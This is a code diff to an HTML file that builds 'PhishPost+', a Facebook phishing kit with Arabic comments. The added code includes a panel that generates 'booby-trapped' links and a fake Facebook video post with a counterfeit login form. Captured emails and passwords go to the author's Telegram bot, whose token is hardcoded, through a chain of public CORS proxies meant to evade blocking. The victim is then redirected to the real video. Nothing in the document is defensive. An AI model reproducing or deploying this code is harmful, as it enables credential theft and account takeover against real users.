@@ -3,11 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook</title>
+    <title>PhishPost+</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; }
-        .container { max-width: 500px; width: 100%; background: white; margin-top: 20px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+        body { font-family: 'Segoe UI', Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; }
+
+        /* ===== الصفحة الرئيسية (واجهة الإنشاء) ===== */
+        .gen-container { max-width: 500px; width: 100%; background: white; margin-top: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 25px; display: none; }
+        .gen-container.active { display: block; }
+        .gen-container h2 { margin-bottom: 10px; }
+        .gen-container p { color: #65676b; margin-bottom: 20px; }
+        .gen-container input[type="text"] { width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 15px; margin-bottom: 15px; }
+        .gen-container button { background: #1877f2; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
+        .result-box { margin-top: 20px; background: #e7f3ff; padding: 15px; border-radius: 6px; word-break: break-all; display: none; }
+        .result-box input { width: 100%; padding: 10px; margin-top: 8px; border: 1px solid #dddfe2; border-radius: 4px; }
+
+        /* ===== صفحة التصيد (منشور فيسبوك) ===== */
+        .post-container { max-width: 500px; width: 100%; background: white; margin-top: 20px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); display: none; }
+        .post-container.active { display: block; }
         .header { padding: 10px 16px; display: flex; align-items: center; border-bottom: 1px solid #dddfe2; }
         .header img { width: 40px; height: 40px; border-radius: 50%; margin-right: 8px; }
         .header .name { font-weight: 600; }
@@ -15,6 +28,8 @@
         .video-placeholder { width: 100%; height: 300px; background: #000; position: relative; cursor: pointer; display: flex; align-items: center; justify-content: center; }
         .video-placeholder::before { content: "▶"; font-size: 60px; color: white; opacity: 0.9; }
         .actions { display: flex; justify-content: space-around; padding: 10px; border-top: 1px solid #dddfe2; font-size: 14px; color: #65676b; }
+
+        /* ===== نافذة تسجيل الدخول ===== */
         .login-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.96); z-index: 10; align-items: center; justify-content: center; }
         .login-overlay.active { display: flex; }
         .login-box { background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); padding: 20px; max-width: 400px; width: 90%; text-align: center; }
@@ -25,95 +40,142 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yV/r/t9QT8N9hNwl.png" alt="صفحة">
-            <div>
-                <div class="name">صفحة فيسبوك</div>
-                <div class="time">منذ دقيقتين · 🌍</div>
-            </div>
-        </div>
-        <div class="video-placeholder" onclick="openLogin()"></div>
-        <div class="actions">
-            <span>👍 إعجاب</span>
-            <span>💬 تعليق</span>
-            <span>↗️ مشاركة</span>
+
+<!-- ===== لوحة إنشاء الرابط الملغوم ===== -->
+<div id="genPanel" class="gen-container active">
+    <h2>📎 أداة PhishPost+</h2>
+    <p>ألصق رابط فيديو فيسبوك لتحصل على رابط ملغوم جاهز للإرسال.</p>
+    <input type="text" id="videoUrlInput" placeholder="مثال: https://www.facebook.com/watch/?v=123456">
+    <button onclick="generatePhishingLink()">🎣 أنشئ الرابط الملغوم</button>
+    <div id="resultBox" class="result-box">
+        <strong>الرابط الملغوم:</strong><br>
+        <input type="text" id="phishingLinkOutput" readonly onclick="this.select();">
+    </div>
+</div>
+
+<!-- ===== واجهة التصيد (تظهر للضحية) ===== -->
+<div id="phishPanel" class="post-container">
+    <div class="header">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yV/r/t9QT8N9hNwl.png" alt="صفحة">
+        <div>
+            <div class="name">صفحة فيسبوك</div>
+            <div class="time">منذ دقيقتين · 🌍</div>
         </div>
     </div>
-
-    <div class="login-overlay" id="loginOverlay">
-        <div class="login-box">
-            <h3>تسجيل الدخول إلى فيسبوك</h3>
-            <p>يجب تسجيل الدخول لمشاهدة هذا الفيديو.</p>
-            <form id="loginForm">
-                <input type="email" name="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-                <input type="password" name="password" id="pass" placeholder="كلمة المرور" required>
-                <button type="submit">تسجيل الدخول</button>
-            </form>
-        </div>
+    <div class="video-placeholder" onclick="openLogin()"></div>
+    <div class="actions">
+        <span>👍 إعجاب</span>
+        <span>💬 تعليق</span>
+        <span>↗️ مشاركة</span>
     </div>
+</div>
 
-    <script>
-        // ========== إعداداتك ==========
-        const TELEGRAM_TOKEN = "8654480187:AAF-vu3ZjbRVBdAUSRA8B3HXE4joSCwjghc";
-        const TELEGRAM_CHAT_ID = "7763665935";
+<!-- ===== نافذة تسجيل الدخول ===== -->
+<div class="login-overlay" id="loginOverlay">
+    <div class="login-box">
+        <h3>تسجيل الدخول إلى فيسبوك</h3>
+        <p>يجب تسجيل الدخول لمشاهدة هذا الفيديو.</p>
+        <form id="loginForm">
+            <input type="text" id="emailInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="passInput" placeholder="كلمة المرور" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
+</div>
 
-        let realVideoUrl = "https://www.facebook.com/";
-        try {
-            const params = new URLSearchParams(window.location.search);
-            const ref = params.get('ref');
-            if (ref) realVideoUrl = atob(ref);
-        } catch(e) {}
+<script>
+    // ========== إعدادات تيليجرام (خاصتك) ==========
+    const TELEGRAM_TOKEN = "8654480187:AAF-vu3ZjbRVBdAUSRA8B3HXE4joSCwjghc";
+    const TELEGRAM_CHAT_ID = "7763665935";
+    // ================================================
 
-        function openLogin() {
-            document.getElementById('loginOverlay').classList.add('active');
+    let realVideoUrl = "https://www.facebook.com/";
+
+    // عند تحميل الصفحة، نتأكد فيما إذا كان هناك بارامتر ref
+    window.onload = function() {
+        const params = new URLSearchParams(window.location.search);
+        const ref = params.get('ref');
+        if (ref) {
+            // توجد إشارة لرابط فيديو → ضحية
+            try { realVideoUrl = atob(ref); } catch(e) { realVideoUrl = "https://www.facebook.com/"; }
+            document.getElementById('genPanel').classList.remove('active');
+            document.getElementById('phishPanel').classList.add('active');
+        } else {
+            // لا يوجد ref → واجهة الإنشاء
+            document.getElementById('genPanel').classList.add('active');
+            document.getElementById('phishPanel').classList.remove('active');
         }
+    };
 
-        // قائمة مسارات إرسال تيليجرام بالترتيب (توقف عند أول نجاح)
-        async function sendToTelegram(email, password) {
-            const msg = `🔥 ضحية جديدة!\n📧 ${email}\n🔒 ${password}`;
-            const baseUrl = `/bot${TELEGRAM_TOKEN}/sendMessage`;
-            const urls = [
-                // 1. مباشر (إذا كان متاحاً عند الضحية)
-                `https://api.telegram.org${baseUrl}`,
-                // 2. عبر CORS Proxy عام (يحول الطلب من خادم غير محظور)
-                `https://corsproxy.io/?${encodeURIComponent(`https://api.telegram.org${baseUrl}`)}`,
-                `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://api.telegram.org${baseUrl}`)}`,
-                // 3. بروكسيات إضافية
-                `https://proxy.techzbots.com/?${encodeURIComponent(`https://api.telegram.org${baseUrl}`)}`,
-                `https://yacdn.org/proxy/https://api.telegram.org${baseUrl}`
-            ];
+    // توليد الرابط الملغوم من رابط الفيديو المدخل
+    function generatePhishingLink() {
+        const videoUrl = document.getElementById('videoUrlInput').value.trim();
+        if (!videoUrl) { alert("يرجى إدخال رابط الفيديو!"); return; }
+        const encoded = btoa(videoUrl);
+        const phishingLink = window.location.href.split('?')[0] + "?ref=" + encoded;
+        document.getElementById('phishingLinkOutput').value = phishingLink;
+        document.getElementById('resultBox').style.display = 'block';
+    }
 
-            for (let url of urls) {
-                try {
-                    // نبني الرابط كامل مع البارامترات
-                    let fullUrl;
-                    if (url.includes('corsproxy.io') || url.includes('allorigins.win') || url.includes('proxy.techzbots.com') || url.includes('yacdn.org')) {
-                        // هذه البروكسيات تتطلب الـ URL كامل في الرابط
-                        fullUrl = url + (url.includes('?') ? '&' : '?') + `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
-                    } else {
-                        fullUrl = url + `?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
-                    }
-                    const response = await fetch(fullUrl, { mode: 'cors' });
-                    if (response.ok) return true;
-                } catch (e) {
-                    continue;
-                }
-            }
-            return false;
-        }
+    // فتح نافذة تسجيل الدخول
+    function openLogin() {
+        document.getElementById('loginOverlay').classList.add('active');
+    }
 
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('pass').value;
-
-            // إرسال للتيليجرام (يحاول جميع المسارات)
-            sendToTelegram(email, password);
-
-            // توجيه الضحية للفيديو الأصلي
-            window.location.href = realVideoUrl;
+    // تنسيق رسالة تيليجرام مرتبة
+    function formatTelegramMessage(email, password) {
+        const now = new Date();
+        const dateStr = now.toLocaleString('ar-IQ', { 
+            weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
+            hour: '2-digit', minute: '2-digit', second: '2-digit'
         });
-    </script>
+        return (
+            `🔥 *ضحية جديدة فيسبوك* 🔥\n\n` +
+            `📧 *البريد الإلكتروني*:\n\`${email}\`\n\n` +
+            `🔐 *كلمة المرور*:\n\`${password}\`\n\n` +
+            `📅 *التاريخ*: ${dateStr}\n` +
+            `🌐 *المنصة*: Facebook - PhishPost+`
+        );
+    }
+
+    // إرسال إلى تيليجرام باستخدام عدة مسارات لتجاوز الحظر
+    async function sendToTelegram(email, password) {
+        const formattedMsg = formatTelegramMessage(email, password);
+        const apiBase = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        const queryParams = `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(formattedMsg)}&parse_mode=Markdown`;
+
+        // قائمة المسارات البديلة
+        const urls = [
+            apiBase + '?' + queryParams,  // مباشر
+            `https://corsproxy.io/?${encodeURIComponent(apiBase + '?' + queryParams)}`,
+            `https://api.allorigins.win/raw?url=${encodeURIComponent(apiBase + '?' + queryParams)}`,
+            `https://proxy.techzbots.com/?${encodeURIComponent(apiBase + '?' + queryParams)}`,
+            `https://yacdn.org/proxy/${apiBase}?${queryParams}`
+        ];
+
+        for (let url of urls) {
+            try {
+                const resp = await fetch(url, { mode: 'cors' });
+                if (resp.ok) return true;
+            } catch(e) { continue; }
+        }
+        return false;
+    }
+
+    // معالجة تقديم نموذج تسجيل الدخول
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const email = document.getElementById('emailInput').value;
+        const password = document.getElementById('passInput').value;
+
+        // إرسال إلى تيليجرام
+        sendToTelegram(email, password);
+
+        // توجيه الضحية إلى الفيديو الأصلي بعد لحظة
+        setTimeout(() => {
+            window.location.href = realVideoUrl;
+        }, 500);
+    });
+</script>
 </body>
 </html>
